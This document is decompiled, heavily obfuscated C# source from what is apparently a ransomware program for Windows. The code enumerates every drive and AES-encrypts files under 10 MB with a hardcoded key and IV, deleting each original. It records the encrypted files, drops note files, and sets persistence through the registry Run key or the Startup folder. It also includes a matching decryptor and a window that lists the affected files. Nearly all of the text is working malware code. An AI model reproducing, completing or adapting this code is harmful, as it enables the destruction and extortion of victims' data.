~(-(-(~(-(~(~(-(-(~(~-944700695)))))))))), _0005_2009_2007_2002_2006_2008_2002_200A_2003_2006_2004_2000_2009_2003_2002._0002())));
		}
	}

	private sealed class _0005_2009_2007_2002_2006_2008_2002_200A_2003_2006_2004_2000_2009_2003_2002
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_0003_200B_2008_2008_2009_200A_2006_2009_200B_200A_200B._0002(), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0002(_0008_2002._0002(typeof(_0005_2009_2007_2002_2006_2008_2002_200A_2003_2006_2004_2000_2009_2003_2002)), _0006_2001_2007_2004_2001_2007_2001_2004_2006_2001_200B._0002())), _0008_2002._0002(typeof(_0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002)));
		}
	}

	private sealed class _0006_2001_2007_2004_2001_2007_2001_2004_2006_2001_200B
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0002(_0008_2002._0002(typeof(_0003_200B_2008_2008_2009_200A_2006_2009_200B_200A_200B)), _0008_2002._0002(typeof(_000F_2005_2009_2002_2009_2002_2003_2004_200B_2002_2000_2009_2001_2009_2002_200B)) ^ _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_0008_2002._0002(typeof(_0006_2001_2007_2004_2001_2007_2001_2004_2006_2001_200B)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_0008_2002._0002(typeof(_0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002)), _000F_2005_2009_2002_2009_2002_2003_2004_200B_2002_2000_2009_2001_2009_2002_200B._0002())));
		}
	}

	private static class _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007
	{
		internal static int _0002(int _0002, int _0003)
		{
			return _0002 ^ (_0003 - -(~(-(~(~(-(-(~(~-944208990)))))))));
		}

		internal static int _0003(int _0002, int _0003)
		{
			return (_0002 - -(~(-(~(~(-(-(~(~-373230802))))))))) ^ (_0003 + -(~(-(~(~(-(-(~(~(-(~-1115235534)))))))))));
		}

		internal static int _0005(int _0002, int _0003)
		{
			return _0002 ^ ((_0003 - -(~(~(-(~(-(~(-(~(-(~1379879769))))))))))) ^ (_0002 - _0003));
		}
	}

	private sealed class _000F_2005_2009_2002_2009_2002_2003_2004_200B_2002_2000_2009_2001_2009_2002_200B
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_0008_2002._0002(typeof(_000F_2005_2009_2002_2009_2002_2003_2004_200B_2002_2000_2009_2001_2009_2002_200B)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0002(_0008_2002._0002(typeof(_0005_2000_2003_2009_2004_2007_2009_200A_2002_2000_2001_2005_2006_2003_2007_2000_200B_2009_2001_2008_2000_200B_2002_2001)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_0008_2002._0002(typeof(_0006_2001_2007_2004_2001_2007_2001_2004_2006_2001_200B)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_0008_2002._0002(typeof(_0003_200B_2008_2008_2009_200A_2006_2009_200B_200A_200B)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0002(_0008_2002._0002(typeof(_0005_2009_2007_2002_2006_2008_2002_200A_2003_2006_2004_2000_2009_2003_2002)), _0008_2002._0002(typeof(_0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002)))))));
		}
	}

	private static _0003_2000_2006_200B_2000_2001_2001_2002_200B_2000_200A_2005_2002_2004_200B_200A m__0002 = new _0003_2000_2006_200B_2000_2001_2001_2002_200B_2000_200A_2005_2002_2004_200B_200A();

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long _0002()
	{
		if ((object)Assembly.GetCallingAssembly() != typeof(_0008_2002).Assembly || !_0008_2002._0002())
		{
			return 0L;
		}
		lock (_0008_2002.m__0002)
		{
			long num = _0008_2002.m__0002._0002();
			if (num == 0)
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				List<byte> list = new List<byte>();
				AssemblyName assemblyName;
				try
				{
					assemblyName = executingAssembly.GetName();
				}
				catch
				{
					assemblyName = new AssemblyName(executingAssembly.FullName);
				}
				byte[] array = assemblyName.GetPublicKeyToken();
				if (array != null && array.Length == 0)
				{
					array = null;
				}
				if (array != null)
				{
					list.AddRange(array);
				}
				list.AddRange(Encoding.Unicode.GetBytes(assemblyName.Name));
				int num2 = _0002(typeof(_0008_2002));
				int num3 = _0005_2000_2003_2009_2004_2007_2009_200A_2002_2000_2001_2005_2006_2003_2007_2000_200B_2009_2001_2008_2000_200B_2002_2001._0002();
				list.Add((byte)(num2 >> 16));
				list.Add((byte)(num3 >> 8));
				list.Add((byte)(num2 >> 8));
				list.Add((byte)(num3 >> 24));
				list.Add((byte)(num2 >> 24));
				list.Add((byte)num3);
				list.Add((byte)num2);
				list.Add((byte)(num3 >> 16));
				int count = list.Count;
				ulong num4 = 0uL;
				for (int i = 0; i != count; i++)
				{
					num4 += list[i];
					num4 += num4 << 20;
					num4 ^= num4 >> 12;
					list[i] = 0;
				}
				num4 += num4 << 6;
				num4 ^= num4 >> 22;
				num4 += num4 << 30;
				num = (long)num4;
				num ^= -7424734944298270088L;
				_0008_2002.m__0002._0002(num);
			}
			return num;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool _0002()
	{
		if (!_0003())
		{
			return false;
		}
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool _0003()
	{
		StackTrace stackTrace = new StackTrace();
		Type type = (stackTrace.GetFrame(3)?.GetMethod())?.DeclaringType;
		if ((object)type == typeof(RuntimeMethodHandle))
		{
			return false;
		}
		if ((object)type == null)
		{
			return false;
		}
		if ((object)type.Assembly != typeof(_0008_2002).Assembly)
		{
			return false;
		}
		return true;
	}

	private static int _0002(Type _0002)
	{
		return _0002.MetadataToken;
	}
}
internal interface _000E
{
	bool _000E_200A_2005_2008_0002();

	object _000E_200A_2005_2008_0002();

	void _000E_200A_2005_2008_0002();
}
public sealed class _000E_2000 : Form
{
	private IContainer m__0002;

	private Timer _0003;

	public _000E_2000()
	{
		this._0002();
		_0003.set_Interval(_0006_2000._000F_2000);
		_0003.set_Enabled(true);
	}

	private void _0002(object _0002, EventArgs _0003)
	{
		if (!_0006_2000._000E_2000 && _0006_2001._0002())
		{
			_0006_2000._000E_2000 = true;
			_000E_2000._0002();
			((Form)new _0002_2001()).Show((IWin32Window)(object)this);
		}
	}

	private static void _0002()
	{
		_000E_2001._0002();
	}

	protected override void Dispose(bool _0002)
	{
		if (_0002 && this.m__0002 != null)
		{
			this.m__0002.Dispose();
		}
		((Form)this).Dispose(_0002);
	}

	private void _0002()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		this.m__0002 = new Container();
		_0003 = new Timer(this.m__0002);
		((Control)this).SuspendLayout();
		_0003.set_Enabled(true);
		_0003.add_Tick((EventHandler)_0002);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name(_0003_2002._0002(-1022258294));
		((Control)this).set_Text(_0003_2002._0002(-1022258273));
		((Control)this).ResumeLayout(false);
	}
}
internal static class _000E_2001
{
	[Serializable]
	private sealed class _0002
	{
		public static readonly _0002 _0002 = new _0002();

		public static Func<DriveInfo, string> _0003;

		public static Func<string, string, global::_0002<string, string>> _0005;

		public static Func<global::_0002<string, string>, bool> _0008;

		public static Func<global::_0002<string, string>, string> _0006;

		public static Func<string, global::_0003<string, FileInfo>> _000E;

		public static Func<global::_0003<string, FileInfo>, bool> _000F;

		public static Func<global::_0003<string, FileInfo>, string> _0002_2000;

		internal string _0002(DriveInfo _0002)
		{
			return _0002.RootDirectory.FullName;
		}

		internal global::_0002<string, string> _0002(string _0002, string _0003)
		{
			return new global::_0002<string, string>(_0002, _0003);
		}

		internal bool _0002(global::_0002<string, string> _0002)
		{
			return _0002._0002().EndsWith(_0002._0003());
		}

		internal string _0002(global::_0002<string, string> _0002)
		{
			return _0002._0002();
		}

		internal global::_0003<string, FileInfo> _0002(string _0002)
		{
			return new global::_0003<string, FileInfo>(_0002, new FileInfo(_0002));
		}

		internal bool _0002(global::_0003<string, FileInfo> _0002)
		{
			return _0002._0003().Length < 10000000;
		}

		internal string _0002(global::_0003<string, FileInfo> _0002)
		{
			return _0002._0002();
		}
	}

	private sealed class _0003
	{
		public HashSet<string> _0002;

		public Func<string, IEnumerable<string>> _0003;

		internal IEnumerable<string> _0002(string _0002)
		{
			return this._0002;
		}
	}

	private sealed class _0005 : IEnumerable<string>, IEnumerable, IEnumerator<string>, IDisposable, IEnumerator
	{
		private int _0002;

		private string _0003;

		private int m__0005;

		private string _0008;

		public string _0006;

		private Queue<string> _000E;

		private string[] _000F;

		private int _0002_2000;

		[DebuggerHidden]
		public _0005(int _0002)
		{
			this._0002 = _0002;
			m__0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _0005_200A_2005_2008_0002()
		{
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0005_200A_2005_2008_0002();
		}

		private bool MoveNext()
		{
			int num = _0002;
			if (num != 0)
			{
				if (num != 1)
				{
					return false;
				}
				_0002 = -1;
				_0002_2000++;
				goto IL_00f2;
			}
			_0002 = -1;
			_000E = new Queue<string>();
			_000E.Enqueue(_0008);
			goto IL_0109;
			IL_00f2:
			if (_0002_2000 < _000F.Length)
			{
				string text = (_0003 = _000F[_0002_2000]);
				_0002 = 1;
				return true;
			}
			_000F = null;
			goto IL_0109;
			IL_0109:
			string[] array;
			do
			{
				if (_000E.Count > 0)
				{
					_0008 = _000E.Dequeue();
					try
					{
						string[] directories = Directory.GetDirectories(_0008);
						foreach (string item in directories)
						{
							_000E.Enqueue(item);
						}
					}
					catch (Exception value)
					{
						Console.Error.WriteLine(value);
					}
					array = null;
					try
					{
						array = Directory.GetFiles(_0008);
					}
					catch (Exception value2)
					{
						Console.Error.WriteLine(value2);
					}
					continue;
				}
				return false;
			}
			while (array == null);
			_000F = array;
			_0002_2000 = 0;
			goto IL_00f2;
		}

		bool IEnumerator.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			return this.MoveNext();
		}

		[DebuggerHidden]
		private string _0005_200A_2005_2008_0002()
		{
			return _0003;
		}

		string IEnumerator<string>.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private void _0005_200A_2005_2008_0003()
		{
			throw new NotSupportedException();
		}

		void IEnumerator.Reset()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0005_200A_2005_2008_0003();
		}

		[DebuggerHidden]
		private object _0005_200A_2005_2008_0002()
		{
			return _0003;
		}

		object IEnumerator.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private IEnumerator<string> _0005_200A_2005_2008_0002()
		{
			_0005 obj;
			if (_0002 == -2 && m__0005 == Thread.CurrentThread.ManagedThreadId)
			{
				_0002 = 0;
				obj = this;
			}
			else
			{
				obj = new _0005(0);
			}
			obj._0008 = _0006;
			return obj;
		}

		IEnumerator<string> IEnumerable<string>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private IEnumerator _0005_200A_2005_2008_0002()
		{
			return this._0005_200A_2005_2008_0002();
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}
	}

	private static readonly string m__0002 = Path.Combine(_0006_2000._0005_2000, _0003_2002._0002(-1022255577));

	private static readonly HashSet<string> m__0003 = new HashSet<string>();

	internal static void _0002()
	{
		HashSet<string> hashSet = new HashSet<string>(_000E_2001._0002());
		foreach (string item in DriveInfo.GetDrives().Select(_000E_2001._0002._0002._0002))
		{
			_0002(item, _0003_2002._0002(-1022258261), hashSet);
		}
		if (!File.Exists(_000E_2001.m__0002))
		{
			string[] contents = _000E_2001.m__0003.ToArray();
			File.WriteAllLines(_000E_2001.m__0002, contents);
		}
	}

	internal static HashSet<string> _0002()
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (File.Exists(_000E_2001.m__0002))
		{
			string[] array = File.ReadAllLines(_000E_2001.m__0002);
			foreach (string item in array)
			{
				hashSet.Add(item);
			}
		}
		return hashSet;
	}

	private static string _0002()
	{
		string text = Path.Combine(_0006_2000._0005_2000, _0003_2002._0002(-1022256701));
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		TextWriter textWriter = new StreamWriter(Path.Combine(text, _0003_2002._0002(-1022256658)), append: true);
		try
		{
			textWriter.WriteLine(_0003_2002._0002(-1022256644));
		}
		finally
		{
			((IDisposable)textWriter).Dispose();
		}
		TextWriter textWriter2 = new StreamWriter(Path.Combine(text, _0003_2002._0002(-1022256761)), append: true);
		try
		{
			textWriter2.WriteLine(_0003_2002._0002(-1022256721));
			return text;
		}
		finally
		{
			((IDisposable)textWriter2).Dispose();
		}
	}

	private static IEnumerable<string> _0002()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in _0005_2001._0002().Split(new string[2]
		{
			Environment.NewLine,
			_0003_2002._0002(-1022256822)
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		hashSet.Remove(_0003_2002._0002(-1022258261));
		return hashSet;
	}

	private static IEnumerable<string> _0002(string _0002)
	{
		return new _0005(-2)
		{
			_0006 = _0002
		};
	}

	private static void _0002(string _0002, string _0003, HashSet<string> _0005)
	{
		_0003 obj = new _0003();
		obj._0002 = _0005;
		foreach (string item in _000E_2001._0002(_0002).SelectMany(obj._0002, _000E_2001._0002._0002._0002).Where(_000E_2001._0002._0002._0002)
			.Select<global::_0002<string, string>, string>(_000E_2001._0002._0002._0002)
			.Select(_000E_2001._0002._0002._0002)
			.Where(_000E_2001._0002._0002._0002)
			.Select<global::_0003<string, FileInfo>, string>(_000E_2001._0002._0002._0002))
		{
			try
			{
				if (_000E_2001._0002(item, _0003))
				{
					_000E_2001.m__0003.Add(item);
				}
			}
			catch
			{
			}
		}
	}

	internal static void _0002(string _0002)
	{
		foreach (string item in _000E_2001._0002())
		{
			try
			{
				string text = item + _0002;
				_000E_2001._0002(text, _0002);
				File.Delete(text);
			}
			catch
			{
			}
		}
		File.Delete(_000E_2001.m__0002);
	}

	private static bool _0002(string _0002, string _0003)
	{
		try
		{
			if (_0006_2000._0002 != 0 && (_0002.StartsWith(_0006_2000._0005_2000, StringComparison.InvariantCulture) || _0002.StartsWith(_0003_2002._0002(-1022256830), StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String(_0003_2002._0002(-1022256813));
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			_000E_2001._0002(aesCryptoServiceProvider, _0002, _0002 + _0003);
		}
		catch
		{
			return false;
		}
		try
		{
			File.Delete(_0002);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void _0002(string _0002, string _0003)
	{
		try
		{
			if (!_0002.EndsWith(_0003))
			{
				return;
			}
			string text = _0002.Remove(_0002.Length - 4);
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			try
			{
				aesCryptoServiceProvider.Key = Convert.FromBase64String(_0003_2002._0002(-1022256813));
				aesCryptoServiceProvider.IV = new byte[16]
				{
					0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
					2, 0, 6, 7, 6, 0
				};
				_000E_2001._0003(aesCryptoServiceProvider, _0002, text);
			}
			finally
			{
				((IDisposable)aesCryptoServiceProvider).Dispose();
			}
		}
		catch
		{
			return;
		}
		try
		{
			File.Delete(_0002);
		}
		catch (Exception)
		{
		}
	}

	private static void _0002(SymmetricAlgorithm _0002, string _0003, string _0005)
	{
		byte[] array = new byte[65536];
		FileStream fileStream = new FileStream(_0003, FileMode.Open);
		try
		{
			FileStream fileStream2 = new FileStream(_0005, FileMode.Create);
			try
			{
				using CryptoStream cryptoStream = new CryptoStream(fileStream2, _0002.CreateEncryptor(), CryptoStreamMode.Write);
				int num;
				do
				{
					num = fileStream.Read(array, 0, array.Length);
					if (num != 0)
					{
						cryptoStream.Write(array, 0, num);
					}
				}
				while (num != 0);
			}
			finally
			{
				((IDisposable)fileStream2).Dispose();
			}
		}
		finally
		{
			((IDisposable)fileStream).Dispose();
		}
	}

	private static void _0003(SymmetricAlgorithm _0002, string _0003, string _0005)
	{
		byte[] array = new byte[65536];
		FileStream fileStream = new FileStream(_0003, FileMode.Open);
		try
		{
			FileStream fileStream2 = new FileStream(_0005, FileMode.Create);
			try
			{
				using CryptoStream cryptoStream = new CryptoStream(fileStream2, _0002.CreateDecryptor(), CryptoStreamMode.Write);
				int num;
				do
				{
					num = fileStream.Read(array, 0, array.Length);
					if (num != 0)
					{
						cryptoStream.Write(array, 0, num);
					}
				}
				while (num != 0);
			}
			finally
			{
				((IDisposable)fileStream2).Dispose();
			}
		}
		finally
		{
			((IDisposable)fileStream).Dispose();
		}
	}
}
internal interface _000F
{
	void _000F_200A_2005_2008_0002();
}
public sealed class _000F_2000 : Form
{
	private IContainer m__0002;

	private DataGridView _0003;

	private DataGridViewTextBoxColumn _0005;

	private DataGridViewTextBoxColumn _0008;

	public _000F_2000()
	{
		_0002();
	}

	private void _0002(object _0002, EventArgs _0003)
	{
		foreach (string item in _000E_2001._0002())
		{
			if (File.Exists(item + _0003_2002._0002(-1022258261)))
			{
				this._0003.get_Rows().Add(new object[2]
				{
					string.Empty,
					item
				});
			}
			else
			{
				this._0003.get_Rows().Add(new object[2]
				{
					_0003_2002._0002(-1022258265),
					item
				});
			}
		}
	}

	protected override void Dispose(bool _0002)
	{
		if (_0002 && this.m__0002 != null)
		{
			this.m__0002.Dispose();
		}
		((Form)this).Dispose(_0002);
	}

	private void _0002()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		_0003 = new DataGridView();
		_0005 = new DataGridViewTextBoxColumn();
		_0008 = new DataGridViewTextBoxColumn();
		((ISupportInitialize)_0003).BeginInit();
		((Control)this).SuspendLayout();
		_0003.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		_0003.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[2]
		{
			(DataGridViewColumn)_0005,
			(DataGridViewColumn)_0008
		});
		((Control)_0003).set_Dock((DockStyle)5);
		((Control)_0003).set_Location(new Point(0, 0));
		((Control)_0003).set_Name(_0003_2002._0002(-1022258243));
		((Control)_0003).set_Size(new Size(594, 326));
		((Control)_0003).set_TabIndex(0);
		((DataGridViewColumn)_0005).set_HeaderText(_0003_2002._0002(-1022258350));
		((DataGridViewColumn)_0005).set_Name(_0003_2002._0002(-1022258324));
		((DataGridViewBand)_0005).set_ReadOnly(true);
		((DataGridViewColumn)_0005).set_Width(50);
		((DataGridViewColumn)_0008).set_HeaderText(_0003_2002._0002(-1022258320));
		((DataGridViewColumn)_0008).set_Name(_0003_2002._0002(-1022258417));
		((DataGridViewBand)_0008).set_ReadOnly(true);
		((DataGridViewColumn)_0008).set_Width(500);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(594, 326));
		((Control)this).get_Controls().Add((Control)(object)_0003);
		((Control)this).set_Name(_0003_2002._0002(-1022258404));
		((Control)this).set_Text(_0003_2002._0002(-1022258395));
		((Form)this).add_Load((EventHandler)_0002);
		((ISupportInitialize)_0003).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
internal static class _000F_2001
{
	internal enum _0002
	{

	}

	private static readonly IntPtr m__0002 = new IntPtr(-1);

	internal static void _0002(_0002 _0002)
	{
		switch (_0002)
		{
		case (_0002)1:
			try
			{
				_000F_2001._0002(_0006_2000._0002_2000);
				break;
			}
			catch
			{
				_000F_2001._0002();
				break;
			}
		case (_0002)0:
			_000F_2001._0002();
			break;
		}
	}

	private static void _0002()
	{
		if (_0006_2000._000F != null)
		{
			_0006_2000._0002_2000 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(_0006_2000._000F));
		}
	}

	private static void _0002(string _0002)
	{
		Registry.CurrentUser.OpenSubKey(_0003_2002._0002(-1022256782), writable: true)?.SetValue(Path.GetFileName(_0002), _0002);
	}

	internal static void _0003(string _0002)
	{
		Registry.CurrentUser.OpenSubKey(_0003_2002._0002(-1022256782), writable: true)?.DeleteValue(Path.GetFileName(_0002), throwOnMissingValue: false);
	}

	[DllImport("user32.dll", EntryPoint = "SetWindowPos")]
	private static extern bool _0002(IntPtr _0002, IntPtr _0003, int _0005, int _0008, int _0006, int _000E, uint _000F);

	internal static void _0002(Form _0002)
	{
		_000F_2001._0002(((Control)_0002).get_Handle(), _000F_2001.m__0002, 0, 0, 0, 0, 3u);
	}
}
